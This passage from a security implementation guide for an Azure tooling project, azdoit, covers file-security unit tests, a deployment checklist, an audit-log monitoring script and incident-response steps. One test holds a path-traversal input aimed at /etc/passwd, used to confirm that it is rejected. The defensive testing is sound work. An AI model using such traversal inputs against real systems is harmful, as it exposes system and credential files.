    """Test secure file operations."""

    def test_validates_allowed_path(self):
        """Should allow paths in allowed directories."""
        allowed_path = Path.home() / '.azlin' / 'objectives' / 'test.txt'
        validated = SecureFileManager.validate_path(allowed_path)

        assert validated.is_absolute()

    def test_rejects_path_traversal(self):
        """Should reject path traversal attempts."""
        malicious_path = Path.home() / '.azlin' / '..' / '..' / 'etc' / 'passwd'

        with pytest.raises(SecurityError):
            SecureFileManager.validate_path(malicious_path)

    def test_creates_file_with_secure_permissions(self):
        """Should create files with correct permissions."""
        test_file = Path(tempfile.mktemp())
        SecureFileManager.create_secure_file(test_file, 'content', sensitive=True)

        assert test_file.exists()
        assert test_file.stat().st_mode & 0o777 == 0o600
        test_file.unlink()
```

---

## 5. Deployment Checklist

### Pre-Deployment

- [ ] All security validators implemented and tested
- [ ] Audit logging integrated into all Azure operations
- [ ] File permissions validated (0600 for sensitive files)
- [ ] Rate limiters configured for external APIs
- [ ] Integration with existing security infrastructure verified
- [ ] Unit tests passing (100% coverage for security modules)
- [ ] Integration tests passing
- [ ] Penetration tests conducted

### Deployment

- [ ] Deploy security modules to production
- [ ] Enable audit logging
- [ ] Configure rate limiters
- [ ] Verify Azure CLI authentication working
- [ ] Test end-to-end workflow with validation
- [ ] Monitor audit logs for first operations

### Post-Deployment

- [ ] Monitor audit logs daily for suspicious activity
- [ ] Review validation findings weekly
- [ ] Update security patterns as new threats discovered
- [ ] Conduct security review monthly

---

## 6. Monitoring & Incident Response

### 6.1 Audit Log Monitoring

```python
# scripts/monitor_audit_logs.py
import json
from pathlib import Path
from datetime import datetime, timedelta


def analyze_audit_logs(session_id: str):
    """Analyze audit logs for security events."""

    log_file = Path.home() / '.claude' / 'runtime' / 'logs' / 'azdoit' / session_id / 'audit.log'

    if not log_file.exists():
        return

    # Read all entries
    entries = []
    with open(log_file) as f:
        for line in f:
            entries.append(json.loads(line))

    # Security checks
    alerts = []

    # Check 1: High error rate
    errors = [e for e in entries if e['status'] == 'failure']
    if len(errors) > 10:
        alerts.append(f"High error rate: {len(errors)} failures")

    # Check 2: Privilege escalation attempts
    role_ops = [e for e in entries if 'role' in e['operation'].lower()]
    if role_ops:
        alerts.append(f"Privilege operations detected: {len(role_ops)} operations")

    # Check 3: Cost spikes
    total_cost = sum(e.get('cost_estimate', 0) for e in entries)
    if total_cost > 100.0:
        alerts.append(f"High cost detected: ${total_cost:.2f}")

    # Check 4: Denied operations
    denied = [e for e in entries if e['status'] == 'denied']
    if denied:
        alerts.append(f"Denied operations: {len(denied)} attempts")

    # Send alerts if any
    if alerts:
        print(f"SECURITY ALERTS for session {session_id}:")
        for alert in alerts:
            print(f"  - {alert}")
```

### 6.2 Incident Response Procedures

**Credential Leakage:**
1. Immediately revoke: `az logout && az account clear`
2. Review audit logs for unauthorized operations
3. Update `ContentSanitizer` patterns
4. Notify security team

**Malicious Code Execution:**
1. Quarantine affected resources
2. Review audit logs for attacker actions
3. Revert unauthorized changes
4. Update validators to catch similar patterns

---

## Summary

This implementation guide provides production-ready security controls for the azdoit enhancement:

1. **Comprehensive Validation**: Objectives, resource names, generated code (Terraform, shell, Python)
2. **Audit Logging**: All Azure operations logged with structured data
3. **Secure File Operations**: Path validation, secure permissions, temp file cleanup
4. **Rate Limiting**: Protection against API abuse
5. **Integration**: Builds on existing security infrastructure
6. **Testing**: Unit, integration, and penetration tests
7. **Monitoring**: Audit log analysis and incident response

All code is ready for integration into `/Users/ryan/src/azlin/src/azlin/azdoit/`.
